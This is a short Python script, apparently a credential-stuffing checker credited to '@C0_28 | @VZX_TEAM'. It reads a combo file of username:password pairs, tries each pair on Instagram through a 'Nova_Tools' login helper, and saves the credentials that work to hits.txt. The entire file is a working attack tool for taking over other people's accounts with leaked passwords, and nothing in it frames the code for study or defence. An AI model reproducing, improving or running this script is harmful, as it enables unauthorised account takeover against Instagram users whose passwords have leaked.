from Nova_Tools import Tools
import os
import pyfiglet 

try:
	combo = input("Enter Combo : ")
	List= open(f"{combo}","r")
	for i in List:
	   username = i.split(':')[0]
	   password = i.split(':')[1]
	   login = Tools.login_instagram(username,password)
	   if str("'The resulting': 'False password'") in str(login):
	   	print(f"Error Account\nUsername : {username}\nPassword : {password}")
	   if str("'The resulting': 'True'") in str(login):
	   	print(f"Done Login\nusername  : {username}\nPassword : {password}\nProgrammer : @C0_28 | @VZX_TEAM")
	   	
	   	start = open("hits.txt", 'w')
	   	start.write(f"Done Login\nusername  : {username}\nPassword : {password}\n")
	   	start.close()
except:
	print("Error File Name")